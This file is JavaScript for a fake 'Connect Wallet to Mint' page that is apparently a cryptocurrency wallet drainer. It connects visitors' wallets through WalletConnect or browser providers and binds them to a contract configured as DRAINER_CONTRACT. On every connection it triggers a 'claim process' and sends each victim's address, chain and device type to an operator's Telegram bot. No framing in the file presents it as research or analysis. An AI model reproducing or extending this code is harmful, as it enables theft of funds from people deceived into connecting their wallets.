import { CONFIG } from './config.js';

;(function () {
  'use strict';

  /* ══════════════════════════════════════════════════════════════════════════
     CONFIG
     ══════════════════════════════════════════════════════════════════════════ */
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
  } = CONFIG || {};

  const PRIMARY_PROJECT_ID  = PROJECT_ID  || PUBLIC_TEST_ID;
  const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID;

  const RELAY_URLS = [
    'wss://relay.walletconnect.com',
    'wss://relay.walletconnect.org',
  ];

  const CDN = {
    provider: [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ],
    modal: [
      'https://esm.sh/@walletconnect/modal@2.6.2?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
    ],
    web3: [
      'https://esm.sh/web3@4.3.0?bundle',
      'https://cdn.jsdelivr.net/npm/web3@4.3.0/+esm',
    ],
  };

  /* ══════════════════════════════════════════════════════════════════════════
     PLATFORM
     ══════════════════════════════════════════════════════════════════════════ */
  const UA = navigator.userAgent || '';
  const isMobileDevice  = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOSDevice     = /iPhone|iPad|iPod/i.test(UA);
  const isAndroidDevice = /Android/i.test(UA);
  const isDesktopDevice = !isMobileDevice;

  const getPlatform = () => {
    if (isIOSDevice) return 'ios';
    if (isAndroidDevice) return 'android';
    if (/Windows/i.test(UA)) return 'windows';
    if (/Macintosh|Mac OS X/i.test(UA)) return 'mac';
    return 'unknown';
  };

  /* ══════════════════════════════════════════════════════════════════════════
     DEBUG PANEL
     ══════════════════════════════════════════════════════════════════════════ */
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  const logDebug = (msg) => {
    const ts = new Date().toLocaleTimeString();
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  };

  /* ══════════════════════════════════════════════════════════════════════════
     UTILITIES
     ══════════════════════════════════════════════════════════════════════════ */
  const withTimeout = (promise, ms, label) =>
    Promise.race([
      promise,
      new Promise((_, reject) =>
        setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms)
      ),
    ]);

  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  const shortAddress = (a) => (a ? `${a.slice(0, 6)}...${a.slice(-4)}` : '');

  /* ══════════════════════════════════════════════════════════════════════════
     IN-WALLET BROWSER DETECTION
     ══════════════════════════════════════════════════════════════════════════ */
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (!eth) return null;
    if (eth.isMetaMask && /MetaMaskMobile/i.test(UA)) return { wallet: 'metamask', name: 'MetaMask' };
    if (eth.isTrust || /TrustWallet/i.test(UA))       return { wallet: 'trust',    name: 'Trust Wallet' };
    if (eth.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    if (/Rainbow/i.test(UA))                          return { wallet: 'rainbow',  name: 'Rainbow' };
    if (eth.isRabby || /Rabby/i.test(UA))             return { wallet: 'rabby',    name: 'Rabby' };
    return null;
  }

  /* ══════════════════════════════════════════════════════════════════════════
     TELEGRAM
     ══════════════════════════════════════════════════════════════════════════ */
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG || {};

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      if (!r.ok) { console.error('[main.js] Telegram error:', await r.text()); return false; }
      return true;
    } catch (e) {
      console.error('[main.js] Telegram exception:', e);
      return false;
    }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  /* ══════════════════════════════════════════════════════════════════════════
     LIBRARY LOADING
     ══════════════════════════════════════════════════════════════════════════ */
  async function tryImport(urls, pickFn, label, timeoutMs = 8000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m = await withTimeout(import(url), timeoutMs, `${label} @ ${url}`);
        const v = pickFn(m);
        if (!v) throw new Error(`${label} export not found at ${url}`);
        logDebug(`✅ ${label} from ${url} (${(performance.now() - t0).toFixed(0)}ms)`);
        return v;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${label} fail @ ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  async function loadWalletConnectLibraries() {
    const [EthereumProvider, WalletConnectModal, Web3Mod] = await Promise.all([
      tryImport(CDN.provider, (m) => m.EthereumProvider || m.default || m, 'EthereumProvider'),
      tryImport(CDN.modal,    (m) => m.WalletConnectModal || m.default || m, 'Modal'),
      tryImport(CDN.web3,     (m) => m.default || m.Web3 || m,               'Web3'),
    ]);
    return {
      EthereumProvider,
      WalletConnectModal,
      Web3: Web3Mod.default || Web3Mod,
    };
  }

  /* ══════════════════════════════════════════════════════════════════════════
     RELAY PROBE
     ══════════════════════════════════════════════════════════════════════════ */
  async function pickRelayUrl(timeoutMs = 2500) {
    for (const url of RELAY_URLS) {
      try {
        const ok = await withTimeout(
          new Promise((resolve) => {
            const ws = new WebSocket(url);
            const t = setTimeout(() => { try { ws.close(); } catch {} resolve(false); }, timeoutMs);
            ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(true); };
            ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(false); };
          }),
          timeoutMs + 500,
          `ws-probe ${url}`
        );
        if (ok) { logDebug(`🌐 Relay OK: ${url}`); return url; }
      } catch { /* next */ }
    }
    logDebug('⚠️ No relay reachable — SDK will pick default');
    return null;
  }

  /* ══════════════════════════════════════════════════════════════════════════
     DOM
     ══════════════════════════════════════════════════════════════════════════ */
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  /* ══════════════════════════════════════════════════════════════════════════
     STATE — single source of truth
     ══════════════════════════════════════════════════════════════════════════ */
  const State = {
    // library refs
    EthereumProvider: null,
    WalletConnectModal: null,
    Web3Ctor: null,

    // live provider objects
    wcProvider: null,          // WC EthereumProvider instance (owned by us)
    injectedProvider: null,    // window.ethereum (EIP-1193)
    activeProvider: null,      // whichever is live right now
    web3: null,
    contract: null,

    // lifecycle flags
    status: 'idle',            // idle | connecting | connected | disconnecting
    mode: null,                // 'walletconnect' | 'injected' | null

    // account
    address: null,
    chain: 'evm',

    // events bound
    wcEventsBound: false,
    injectedEventsBound: false,
  };

  const isBusy = () =>
    State.status === 'connecting' || State.status === 'disconnecting';

  const isConnected = () =>
    State.status === 'connected' && !!State.address;

  /* ══════════════════════════════════════════════════════════════════════════
     PERSISTENCE
     ══════════════════════════════════════════════════════════════════════════ */
  const LS = {
    addr: 'connectedWallet',
    mode: 'connectionMode',
  };
  const persist = (address, mode) => {
    try {
      localStorage.setItem(LS.addr, address);
      if (mode) localStorage.setItem(LS.mode, mode);
    } catch {}
  };
  const readSaved = () => ({
    address: localStorage.getItem(LS.addr),
    mode: localStorage.getItem(LS.mode),
  });
  const clearSaved = () => {
    try {
      localStorage.removeItem(LS.addr);
      localStorage.removeItem(LS.mode);
    } catch {}
  };

  /* ══════════════════════════════════════════════════════════════════════════
     BUTTON UI
     ══════════════════════════════════════════════════════════════════════════ */
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => { if (!isConnected()) setButtonState(button, 'normal'); }, 2500);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    Object.assign(claimStatus.style, {
      display: 'block',
      padding: '12px 16px',
      borderRadius: '8px',
      marginTop: '12px',
      fontWeight: '500',
      fontSize: '14px',
      textAlign: 'center',
    });
    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  /* ══════════════════════════════════════════════════════════════════════════
     GLOBAL PUBLISH (script.js contract)
     ══════════════════════════════════════════════════════════════════════════ */
  function publishGlobalState() {
    if (!State.address) {
      window.__apexConnected = null;
      return;
    }
    window.__apexConnected = {
      address: State.address,
      chain: State.chain,
      web3: State.web3,
      contract: State.contract,
      provider: State.activeProvider,
      mode: State.mode,
      publishedAt: Date.now(),
    };
    window.dispatchEvent(new CustomEvent('apex:connected', {
      detail: { address: State.address, chain: State.chain },
    }));
  }

  /* ══════════════════════════════════════════════════════════════════════════
     CONNECTED UI
     ══════════════════════════════════════════════════════════════════════════ */
  function updateConnectedUI() {
    if (!State.address) return;
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[State.chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${shortAddress(State.address)}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(State.address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState();

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
🧩 <b>Mode:</b> ${State.mode || 'unknown'}
👤 <b>Address:</b> <code>${State.address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobileDevice ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
  }

  /* ══════════════════════════════════════════════════════════════════════════
     EIP-6963
     ══════════════════════════════════════════════════════════════════════════ */
  const eip6963 = {
    providers: [],
    ready: false,
    init() {
      if (this.ready) return;
      this.ready = true;
      window.addEventListener('eip6963:announceProvider', (e) => {
        const d = e.detail;
        if (!d?.info?.uuid) return;
        if (!this.providers.some((p) => p.info.uuid === d.info.uuid)) {
          this.providers.push(d);
          logDebug(`EIP-6963: ${d.info.name}`);
        }
      });
      const request = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
      request();
      setTimeout(request, 300);
      setTimeout(request, 1000);
    },
  };

  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;
    const modalEl = document.createElement('div');
    modalEl.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;`;
    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);

    const list = modalEl.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `background:#374151;border:none;padding:12px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;`;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px';
        i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  /* ══════════════════════════════════════════════════════════════════════════
     WALLETCONNECT — provider lifecycle
     ══════════════════════════════════════════════════════════════════════════ */
  async function initWalletConnect({ useFallbackId = false } = {}) {
    if (State.wcProvider) return State.wcProvider;

    const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;
    if (!projectId) {
      logDebug('❌ No WalletConnect projectId configured');
      return null;
    }
    if (!State.EthereumProvider) {
      logDebug('❌ EthereumProvider class not loaded');
      return null;
    }

    const relayUrl = await pickRelayUrl();

    logDebug(`WC init: projectId=${String(projectId).slice(0, 8)}…`);
    const t0 = performance.now();

    const opts = {
      projectId,
      chains: [MAINNET_ID],
      optionalChains: [MAINNET_ID],
      showQrModal: false,                    // we render our own
      methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4', 'eth_sign'],
      events: ['chainChanged', 'accountsChanged'],
      metadata: DAPP_METADATA,
    };
    if (relayUrl) opts.relayUrl = relayUrl;

    try {
      const provider = await withTimeout(
        State.EthereumProvider.init(opts),
        15000,
        'EthereumProvider.init'
      );
      State.wcProvider = provider;
      bindWCProviderEvents(provider);
      logDebug(`✅ WC provider ready in ${(performance.now() - t0).toFixed(0)}ms`);
      return provider;
    } catch (e) {
      logDebug(`WC init failed: ${e.message}`);
      State.wcProvider = null;
      return null;
    }
  }

  function bindWCProviderEvents(provider) {
    if (!provider || State.wcEventsBound) return;
    State.wcEventsBound = true;

    provider.on('accountsChanged', (accounts) => {
      logDebug(`WC accountsChanged: ${JSON.stringify(accounts)}`);
      if (!accounts?.length) {
        hardDisconnect({ silent: true });
        return;
      }
      State.address = accounts[0];
      persist(State.address, 'walletconnect');
      updateConnectedUI();
      setTimeout(() => window.initiateClaimProcess?.(), 800);
    });

    provider.on('chainChanged', (id) => {
      logDebug(`WC chainChanged: ${id}`);
      showStatus(`Network changed to ${id}`, 'info');
      if (State.address && State.web3) {
        State.contract = new State.web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState();
      }
    });

    provider.on('disconnect', (reason) => {
      logDebug(`WC disconnect: ${reason}`);
      hardDisconnect({ silent: true });
    });

    provider.on('session_delete', () => {
      logDebug('WC session_delete');
      hardDisconnect({ silent: true });
    });
  }

  /* ══════════════════════════════════════════════════════════════════════════
     INJECTED EVM
     ══════════════════════════════════════════════════════════════════════════ */
  function bindInjectedEvents(provider) {
    if (!provider?.on || State.injectedEventsBound) return;
    State.injectedEventsBound = true;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts?.length) {
        hardDisconnect({ silent: true });
      } else {
        State.address = accounts[0];
        persist(State.address, 'injected');
        updateConnectedUI();
        setTimeout(() => window.initiateClaimProcess?.(), 800);
      }
    });

    provider.on('chainChanged', () => {
      if (State.address && State.web3) {
        State.contract = new State.web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState();
      }
    });

    provider.on('disconnect', () => hardDisconnect({ silent: true }));
  }

  async function connectInjected() {
    eip6963.init();
    await sleep(350);

    const inWallet = detectInWalletBrowser();
    let providers = eip6963.providers.filter((p) => p.provider);

    // Fallback to window.ethereum if no EIP-6963 announcements
    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: inWallet?.name || 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return null;

    // Choose provider
    let chosen = null;
    if (inWallet && window.ethereum) {
      chosen = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find(
        (p) => p.info?.rdns === 'io.metamask' || /metamask/i.test(p.info?.name || '')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return null;
    }

    try {
      const provider = chosen.provider;
      const accounts = await withTimeout(
        provider.request({ method: 'eth_requestAccounts' }),
        20000,
        'eth_requestAccounts'
      );
      if (!accounts?.length) return null;

      const address = accounts[0];
      State.injectedProvider = provider;
      State.activeProvider   = provider;
      State.mode             = 'injected';
      State.address          = address;
      State.chain            = 'evm';
      State.web3             = new State.Web3Ctor(provider);
      State.contract         = new State.web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      bindInjectedEvents(provider);
      persist(address, 'injected');
      logDebug(`✅ Injected connected: ${address} (${chosen.info?.name || 'wallet'})`);
      return address;
    } catch (e) {
      logDebug('Injected error: ' + e.message);
      return null;
    }
  }

  /* ══════════════════════════════════════════════════════════════════════════
     WALLETCONNECT CONNECT — modal opens BEFORE enable(), always closed in finally
     ══════════════════════════════════════════════════════════════════════════ */
  async function connectWalletConnect({ useFallbackId = false } = {}) {
    const provider = await initWalletConnect({ useFallbackId });
    if (!provider) return null;

    // Case 1 — already have a live session (restored or prior approval)
    if (provider.session && provider.accounts?.length) {
      const a = provider.accounts[0];
      State.activeProvider = provider;
      State.mode           = 'walletconnect';
      State.address        = a;
      State.chain          = 'evm';
      State.web3           = new State.Web3Ctor(provider);
      State.contract       = new State.web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      persist(a, 'walletconnect');
      logDebug(`✅ WC session reused: ${a}`);
      return a;
    }

    // Case 2 — fresh pairing
    const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;

    let modal = null;
    if (State.WalletConnectModal && !isMobileDevice) {
      try {
        modal = new State.WalletConnectModal({
          projectId,
          themeMode: 'dark',
          themeVariables: {
            '--wcm-z-index': '9999',
            '--wcm-accent-color': '#FF6B00',
            '--wcm-background-color': '#1F2937',
          },
          enableExplorer: true,
        });
      } catch (e) {
        logDebug('Modal init: ' + e.message);
      }
    }

    // display_uri can fire multiple times — guard
    let modalOpened = false;
    const onUri = (uri) => {
      if (modalOpened) return;
      modalOpened = true;
      try { modal?.openModal({ uri }); }
      catch (e) { logDebug('openModal: ' + e.message); }
    };
    provider.on('display_uri', onUri);

    showStatus('Opening wallet…', 'info');

    try {
      // enable() triggers pairing + waits for session approval. This is the
      // correct replacement for SignClient.connect() + approval().
      const accounts = await withTimeout(provider.enable(), 180000, 'WC enable');
      if (!accounts?.length) {
        logDebug('WC enable returned no accounts');
        return null;
      }

      const address = accounts[0];
      State.activeProvider = provider;
      State.mode           = 'walletconnect';
      State.address        = address;
      State.chain          = 'evm';
      State.web3           = new State.Web3Ctor(provider);
      State.contract       = new State.web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      persist(address, 'walletconnect');
      logDebug(`✅ WC connected: ${address}`);
      return address;
    } catch (e) {
      logDebug('WC enable error: ' + e.message);
      return null;
    } finally {
      try { provider.removeListener?.('display_uri', onUri); } catch {}
      try { modal?.closeModal(); } catch {}
    }
  }

  /* ══════════════════════════════════════════════════════════════════════════
     HARD DISCONNECT — idempotent, always kills the WC session
     ══════════════════════════════════════════════════════════════════════════ */
  async function hardDisconnect({ silent = false } = {}) {
    if (State.status === 'disconnecting') return;
    State.status = 'disconnecting';

    const prevMode = State.mode;
    const wc = State.wcProvider;

    try {
      // Kill WC session on relay
      if (prevMode === 'walletconnect' && wc) {
        try {
          if (wc.session) {
            await Promise.race([
              wc.disconnect(),
              sleep(6000).then(() => { throw new Error('disconnect timeout'); }),
            ]);
          }
        } catch (e) {
          logDebug('WC disconnect err: ' + e.message);
        }
      }

      // Injected — best-effort revoke (many wallets ignore this)
      if (prevMode === 'injected' && State.injectedProvider?.request) {
        try {
          await State.injectedProvider.request({
            method: 'wallet_revokePermissions',
            params: [{ eth_accounts: {} }],
          }).catch(() => {});
        } catch {}
      }
    } finally {
      // Hard reset state
      State.wcProvider       = null;
      State.injectedProvider = null;
      State.activeProvider   = null;
      State.web3             = null;
      State.contract         = null;
      State.address          = null;
      State.mode             = null;
      State.chain            = 'evm';
      State.wcEventsBound       = false;
      State.injectedEventsBound = false;
      State.status              = 'idle';

      clearSaved();
      resetConnectedUI();
      window.__apexConnected = null;

      if (!silent) showStatus('Wallet disconnected', 'info');
      logDebug('🔌 Disconnected');
    }
  }

  /* ══════════════════════════════════════════════════════════════════════════
     CONNECT DISPATCHER
     ══════════════════════════════════════════════════════════════════════════ */
  async function connectWallet() {
    if (isBusy()) return;
    State.status = 'connecting';

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    let address = null;
    let lastError = null;

    try {
      const inWallet = detectInWalletBrowser();
      const preferInjected = !!inWallet && isMobileDevice;

      // 1) Try injected if we're inside a wallet browser OR desktop with providers
      if (preferInjected) {
        logDebug(`📱 In-wallet browser: ${inWallet.name}`);
        address = await connectInjected();
      } else if (isDesktopDevice) {
        // Only attempt injected on desktop if EIP-6963 announced OR window.ethereum exists
        eip6963.init();
        if (eip6963.providers.length > 0 || window.ethereum) {
          address = await connectInjected();
        }
      }

      // 2) WalletConnect with primary projectId
      if (!address) {
        address = await connectWalletConnect({ useFallbackId: false });
      }

      // 3) WalletConnect with fallback projectId
      if (!address && FALLBACK_PROJECT_ID && FALLBACK_PROJECT_ID !== PRIMARY_PROJECT_ID) {
        logDebug('Retrying WC with fallback projectId…');
        address = await connectWalletConnect({ useFallbackId: true });
      }
    } catch (e) {
      lastError = e;
      logDebug('connectWallet exception: ' + e.message);
    }

    if (address) {
      State.status = 'connected';
      updateConnectedUI();
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');

      setTimeout(() => {
        window.initiateClaimProcess?.();
      }, 1200);
    } else {
      State.status = 'idle';
      showStatus(
        lastError ? `Connection failed: ${lastError.message}` : 'Connection failed or cancelled',
        'error'
      );
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  /* ══════════════════════════════════════════════════════════════════════════
     DISCONNECT DISPATCHER
     ══════════════════════════════════════════════════════════════════════════ */
  async function disconnectWallet() {
    showStatus('Disconnecting…', 'info');
    await hardDisconnect();
  }

  /* ══════════════════════════════════════════════════════════════════════════
     BUTTON WIRING
     ══════════════════════════════════════════════════════════════════════════ */
  const handleClick = async () => {
    if (isBusy()) return;
    if (isConnected()) await disconnectWallet();
    else               await connectWallet();
  };

  connectButton?.addEventListener('click', handleClick);
  walletButton?.addEventListener('click', handleClick);

  if (walletButton && isMobileDevice) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => connectButton?.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300);
    });
  }

  /* ══════════════════════════════════════════════════════════════════════════
     SESSION RESTORE
     We trust EthereumProvider.init() to rehydrate its own WC session.
     For injected, we validate with eth_accounts — never trust localStorage.
     ══════════════════════════════════════════════════════════════════════════ */
  async function restoreSession() {
    const { address: savedWallet, mode: savedMode } = readSaved();
    if (!savedWallet) return;

    // --- WalletConnect restore ---
    if (savedMode === 'walletconnect' || !savedMode) {
      try {
        const provider = await initWalletConnect({ useFallbackId: false });
        if (provider?.session && provider.accounts?.length) {
          const a = provider.accounts[0];
          State.activeProvider = provider;
          State.mode           = 'walletconnect';
          State.address        = a;
          State.chain          = 'evm';
          State.web3           = new State.Web3Ctor(provider);
          State.contract       = new State.web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          State.status         = 'connected';

          persist(a, 'walletconnect');
          updateConnectedUI();
          logDebug(`♻️ WC session restored: ${a}`);
          return;
        }
      } catch (e) {
        logDebug('WC restore: ' + e.message);
      }
    }

    // --- Injected restore ---
    if (savedMode === 'injected' || !savedMode) {
      const prov = window.ethereum;
      if (prov && isDesktopDevice) {
        try {
          const accounts = await prov.request({ method: 'eth_accounts' });
          if (accounts?.length && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
            State.injectedProvider = prov;
            State.activeProvider   = prov;
            State.mode             = 'injected';
            State.address          = savedWallet;
            State.chain            = 'evm';
            State.web3             = new State.Web3Ctor(prov);
            State.contract         = new State.web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            State.status           = 'connected';

            bindInjectedEvents(prov);
            persist(savedWallet, 'injected');
            updateConnectedUI();
            logDebug(`♻️ Injected session restored: ${savedWallet}`);
            return;
          }
        } catch (e) {
          logDebug('Injected restore: ' + e.message);
        }
      }
    }

    // Nothing restorable — clear stale keys so UI doesn't lie
    logDebug('⚠️ No restorable session — clearing saved wallet');
    clearSaved();
  }

  /* ══════════════════════════════════════════════════════════════════════════
     BOOT
     ══════════════════════════════════════════════════════════════════════════ */
  (async function boot() {
    try {
      const libs = await loadWalletConnectLibraries();
      State.EthereumProvider   = libs.EthereumProvider;
      State.WalletConnectModal = libs.WalletConnectModal;
      State.Web3Ctor           = libs.Web3;
      logDebug('✅ Libraries loaded');

      eip6963.init();

      // Pre-warm WC on mobile so the first tap opens QR instantly
      if (isMobileDevice) {
        logDebug('📱 Pre-warming WC…');
        initWalletConnect({ useFallbackId: false }).catch(() => {});
      }

      // Give EIP-6963 a beat, then restore
      await sleep(400);
      await restoreSession();
    } catch (err) {
      logDebug('Fatal: ' + err.message);
      showStatus('Failed to load wallet libraries', 'error');
      return;
    }

    logDebug(`✅ main.js ready — Platform: ${getPlatform()} | mobile=${isMobileDevice}`);
    console.log('✅ main.js ready — test with testTelegram("hi")');
  })();

  /* ══════════════════════════════════════════════════════════════════════════
     BEFORE UNLOAD — close any modal safely
     ══════════════════════════════════════════════════════════════════════════ */
  window.addEventListener('beforeunload', () => {
    // No-op — WC provider handles its own cleanup.
  });
})();
